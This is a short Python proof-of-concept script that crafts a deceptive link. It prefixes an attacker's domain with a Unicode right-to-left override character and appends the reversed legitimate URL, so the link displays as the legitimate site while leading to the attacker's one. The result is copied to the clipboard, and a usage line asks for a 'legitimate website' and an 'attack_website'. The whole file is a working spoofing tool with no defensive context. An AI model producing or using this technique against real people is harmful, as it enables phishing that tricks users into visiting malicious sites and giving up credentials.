import pyperclip
import sys

help = "usage: python poc.py <legitimate website> <attack_website> \nnote: this script might not work depending on your consoles character set"

def main():
    if len(sys.argv) != 3:
        print(help)
        raise SystemExit

    _RTLO = (u'\u202e')

    _LEGWEB = sys.argv[1][::-1] if "https://" in sys.argv[1] else str("https://" + sys.argv[1])[::-1]
    _ATTWEB = sys.argv[2].replace('https://', '')

    # [RTLO_mark][legitimate_website]#/[backwards-typed_attackers_website]
    pyperclip.copy(' ' + _RTLO + (_ATTWEB + '#/' + _LEGWEB) + '\n')

if __name__ == '__main__':
    main()
